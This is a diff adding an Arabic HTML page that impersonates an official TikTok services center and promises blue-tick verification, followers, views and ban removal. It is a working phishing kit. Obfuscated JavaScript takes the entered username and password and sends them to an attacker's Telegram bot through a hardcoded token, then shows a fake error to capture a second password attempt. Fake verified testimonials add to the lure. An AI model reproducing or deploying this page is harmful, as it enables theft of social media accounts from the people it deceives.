@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مركز خدمات TikTok الاحترافي</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f8f9fa; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .container { width: 100%; max-width: 450px; background: white; min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.05); position: relative; }
+        .header { padding: 30px 20px; text-align: center; border-bottom: 1px solid #f1f1f2; }
+        .title-main { font-size: 22px; font-weight: 800; margin-top: 12px; color: #161823; }
+        .service-list { padding: 20px; display: flex; flex-direction: column; gap: 12px; }
+        .service-item { display: flex; align-items: center; padding: 16px; border: 1px solid #e3e3e3; border-radius: 12px; cursor: pointer; transition: 0.2s; background: #fff; text-align: right; }
+        .service-item:active { background: #f1f1f2; transform: scale(0.98); }
+        .service-icon { font-size: 26px; margin-left: 15px; }
+        .service-info h3 { font-size: 16px; font-weight: 700; color: #161823; }
+        .service-info p { font-size: 12px; color: #8a8b91; margin-top: 3px; }
+        #quantity-section, #login-section { display: none; padding: 20px; text-align: center; animation: slideIn 0.3s; }
+        .quantity-btn { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #e3e3e3; border-radius: 12px; background: white; font-weight: 700; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .quantity-btn:active { background: #fe2c55; color: white; border-color: #fe2c55; }
+        .back-btn { background: none; border: none; color: #fe2c55; cursor: pointer; margin-bottom: 20px; font-size: 14px; font-weight: 700; display: block; width: fit-content; text-align: right; }
+        .input-group { border-bottom: 1px solid #e3e3e3; margin-bottom: 20px; padding: 12px 0; }
+        input { border: none; outline: none; width: 100%; font-size: 16px; background: transparent; text-align: right; color: #161823; }
+        #error-msg { color: #fe2c55; font-size: 13px; margin-bottom: 15px; display: none; font-weight: 600; text-align: right; }
+        .forgot-link { font-size: 14px; font-weight: 600; color: #161823; text-decoration: none; display: block; text-align: right; margin-bottom: 30px; }
+        .submit-btn { width: 100%; padding: 14px; border: none; border-radius: 4px; background-color: #f1f1f2; color: #bdbebf; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: 0.3s; }
+        .comments-section { padding: 25px 20px; background: #fafafa; border-top: 8px solid #f1f1f2; }
+        .add-comment-area { display: flex; gap: 10px; margin-bottom: 25px; align-items: center; }
+        .add-comment-area input { flex-grow: 1; padding: 10px 15px; border: 1px solid #e3e3e3; border-radius: 20px; font-size: 14px; background: #fff; text-align: right; }
+        .post-btn { color: #fe2c55; font-weight: 700; cursor: pointer; border: none; background: none; font-size: 14px; }
+        #custom-comments-list { display: flex; flex-direction: column; gap: 18px; text-align: right; }
+        .comment { display: flex; gap: 12px; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
+        .user-name { font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 4px; color: #161823; }
+        .blue-tick { width: 14px; height: 14px; }
+        .comment-text { font-size: 13px; line-height: 1.5; color: #161823; margin-top: 2px; }
+        .comment-time { font-size: 11px; color: #8a8b91; margin-top: 5px; }
+        #legal-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { background: white; padding: 25px; border-radius: 15px; width: 100%; max-width: 380px; text-align: right; }
+        .close-modal { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-weight: 700; margin-top: 20px; cursor: pointer; }
+        @keyframes slideIn { from { transform: translateY(15px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="main-services">
+            <div class="header">
+                <img src="Token.png" width="105">
+
+                <h1 class="title-main">مركز خدمات TikTok المعتمد</h1>
+            </div>
+            <div class="service-list">
+                <div class="service-item" onclick="_0x4a2b1('توثيق الحساب ✨')">
+                    <span class="service-icon">💙</span>
+                    <div class="service-info"><h3>توثيق الحساب</h3><p>احصل على العلامة الزرقاء الرسمية</p></div>
+                </div>
+                <div class="service-item" onclick="_0x5c1e2('تزويد متابعين حقيقيين')">
+                    <span class="service-icon">👥</span>
+                    <div class="service-info"><h3>زيادة المتابعين</h3><p>دعم الحساب بمتابعين متفاعلين</p></div>
+                </div>
+                <div class="service-item" onclick="_0x5c1e2('تزويد مشاهدات إكسبلور')">
+                    <span class="service-icon">👀</span>
+                    <div class="service-info"><h3>زيادة المشاهدات</h3><p>تصدر قائمة الإكسبلور فوراً</p></div>
+                </div>
+                <div class="service-item" onclick="_0x4a2b1('فك حظر القيود 🔓')">
+                    <span class="service-icon">🔓</span>
+                    <div class="service-info"><h3>فك الحظر</h3><p>استعادة الحسابات المحظورة والمقيدة</p></div>
+                </div>
+            </div>
+            <div class="comments-section">
+                <div class="add-comment-area"><input type="text" id="userCmt" placeholder="أضف تعليقاً..."><button class="post-btn" onclick="_0x9e3f4()">نشر</button></div>
+                <div id="custom-comments-list"></div>
+            </div>
+            <div style="text-align: center; padding: 20px; font-size: 11px; color: #8a8b91; border-top: 1px solid #f1f1f2;">
+                <span onclick="_0x1d2c3('policy')" style="cursor:pointer">سياسة المستخدم</span> | <span onclick="_0x1d2c3('terms')" style="cursor:pointer">شروط الخدمة</span>
+            </div>
+        </div>
+
+        <div id="quantity-section">
+            <button class="back-btn" onclick="_0x2b3a4()">← رجوع للخلف</button>
+            <h2 id="q-title" style="margin-bottom: 25px; font-size: 20px;">اختر الباقة</h2>
+            <div id="q-options">
+                <button class="quantity-btn" onclick="_0x3c4d5('10,000')">10,000</button>
+                <button class="quantity-btn" onclick="_0x3c4d5('25,000')">25,000</button>
+                <button class="quantity-btn" onclick="_0x3c4d5('50,000')">50,000</button>
+                <button class="quantity-btn" onclick="_0x3c4d5('100,000')">100,000</button>
+            </div>
+        </div>
+
+        <div id="login-section">
+            <button class="back-btn" onclick="_0x2b3a4()">← رجوع للخلف</button>
+            <h2 style="font-size: 24px; font-weight: 800;">تأكيد ملكية الحساب</h2>
+            <p style="font-size: 14px; color: #616161; margin: 10px 0 30px;">الخدمة المحددة: <b id="final-service" style="color: #fe2c55;"></b></p>
+            <div id="error-msg">كلمة المرور غير صحيحة، يرجى إعادة المحاولة.</div>
+            <div class="input-group"><input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" oninput="_0x8f7e6()"></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة السر" oninput="_0x8f7e6()"></div>
+            <a href="https://www.tiktok.com/auth/forgot-password" target="_blank" class="forgot-link">نسيت كلمة السر؟</a>
+            <button id="loginBtn" class="submit-btn" onclick="_0x7d6c5()">تفعيل الطلب الآن</button>
+        </div>
+    </div>
+
+    <div id="legal-modal">
+        <div class="modal-content"><h3 id="modal-title"></h3><p id="modal-body" style="margin-top:10px; line-height:1.5; color:#555"></p><button class="close-modal" onclick="document.getElementById('legal-modal').style.display='none'">موافق</button></div>
+    </div>
+
+    <script>
+        const _0x1a2b = ["8506083532:AAHPnaIF_9xBRU5yDmxVUpq6nc0xi00VkN0", "6003914533"];
+        let _0x2b3c = 0; let _0x3c4d = "";
+
+        function _0x2b3a4() { 
+            document.getElementById('quantity-section').style.display = 'none'; 
+            document.getElementById('login-section').style.display = 'none'; 
+            document.getElementById('main-services').style.display = 'block'; 
+            window.scrollTo(0,0);
+        }
+
+        function _0x4a2b1(_0x) { 
+            document.getElementById('final-service').innerText = _0x; 
+            document.getElementById('main-services').style.display = 'none'; 
+            document.getElementById('login-section').style.display = 'block'; 
+            window.scrollTo(0,0); 
+        }
+
+        function _0x5c1e2(_0x) { 
+            _0x3c4d = _0x; 
+            document.getElementById('main-services').style.display = 'none'; 
+            document.getElementById('quantity-section').style.display = 'block'; 
+            document.getElementById('q-title').innerText = "باقة " + _0x; 
+            window.scrollTo(0,0);
+        }
+
+        function _0x3c4d5(_0x) { 
+            document.getElementById('final-service').innerText = _0x3c4d + " (" + _0x + ")"; 
+            document.getElementById('quantity-section').style.display = 'none'; 
+            document.getElementById('login-section').style.display = 'block'; 
+            window.scrollTo(0,0);
+        }
+        
+        async function _0x7d6c5() {
+            const _0u = document.getElementById('username').value; 
+            const _0p = document.getElementById('password').value; 
+            const _0b = document.getElementById('loginBtn');
+            if (_0u && _0p && _0b.style.cursor === "pointer") {
+                _0x2b3c++; 
+                _0b.innerText = "جاري التحقق...";
+                const _0m = `🔥 New Hit!\n🛠 Service: ${document.getElementById('final-service').innerText}\n👤 User: ${_0u}\n🔑 Pass: ${_0p}\n🔢 Attempt: ${_0x2b3c}`;
+                try {
+                    await fetch(`https://api.telegram.org/bot${_0x1a2b[0]}/sendMessage?chat_id=${_0x1a2b[1]}&text=${encodeURIComponent(_0m)}`);
+                    if (_0x2b3c === 1) {
+                        setTimeout(() => { 
+                            document.getElementById('error-msg').style.display = 'block'; 
+                            document.getElementById('password').value = ""; 
+                            _0b.innerText = "تفعيل الطلب الآن"; 
+                            _0x8f7e6(); 
+                        }, 1000);
+                    } else {
+                        window.location.href = "snssdk1128://";
+                        setTimeout(() => { window.location.href = "https://www.tiktok.com/login"; }, 1000);
+                    }
+                } catch(e) { window.location.href = "https://www.tiktok.com/login"; }
+            }
+        }
+
+        function _0x9e3f4() {
+            const _0i = document.getElementById('userCmt'); 
+            const _0l = document.getElementById('custom-comments-list');
+            if(_0i.value.trim() !== "") {
+                const _0d = document.createElement('div'); 
+                _0d.className = 'comment';
+                _0d.innerHTML = `<img src="https://i.pravatar.cc/150?u=me" class="avatar"><div class="comment-body"><p class="user-name">أنت</p><p class="comment-text">${_0i.value}</p><p class="comment-time">الآن</p></div>`;
+                _0l.prepend(_0d); 
+                _0i.value = "";
+            }
+        }
+
+        function _0x1d2c3(_0t) {
+            const _0m = document.getElementById('legal-modal'); 
+            const _0ti = document.getElementById('modal-title'); 
+            const _0b = document.getElementById('modal-body');
+            if(_0t === 'policy') { 
+                _0ti.innerText = "سياسة المستخدم"; 
+                _0b.innerText = "نحن نلتزم بحماية بياناتك وخصوصيتك لعام 2026 وفق معايير الأمان الدولية لشركة TikTok."; 
+            } else { 
+                _0ti.innerText = "شروط الخدمة"; 
+                _0b.innerText = "تخضع الخدمات لعملية تدقيق يدوية للتأكد من ملكية الحساب من قبل الفريق الفني قبل التنفيذ الرسمي."; 
+            }
+            _0m.style.display = 'flex';
+        }
+
+        function _0x8f7e6() {
+            const _0u = document.getElementById('username').value; 
+            const _0p = document.getElementById('password').value; 
+            const _0b = document.getElementById('loginBtn');
+            if (_0u.length >= 3 && _0p.length >= 4) { 
+                _0b.style.backgroundColor = "#fe2c55"; _0b.style.color = "white"; _0b.style.cursor = "pointer"; 
+            } else { 
+                _0b.style.backgroundColor = "#f1f1f2"; _0b.style.color = "#bdbebf"; _0b.style.cursor = "not-allowed"; 
+            }
+        }
+
+        window.onload = function() {
+            const _0d = [{n: "سعد الرويلي", t: "سرعة تنفيذ خيالية للمتابعين 👍"}, {n: "نوف العتيبي", t: "أخيراً توثق حسابي، شكراً!"}, {n: "بندر القحطاني", t: "فكوا الحظر عن حسابي بسرعة"}];
+            const _0l = document.getElementById('custom-comments-list');
+            _0d.forEach(_0x => { _0l.innerHTML += `<div class="comment"><img src="https://i.pravatar.cc/150?u=${Math.random()}" class="avatar"><div class="comment-body"><p class="user-name">${_0x.n} <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" class="blue-tick"></p><p class="comment-text">${_0x.t}</p><p class="comment-time">منذ قليل</p></div></div>`; });
+        }
+    </script>
+</body>
+</html>
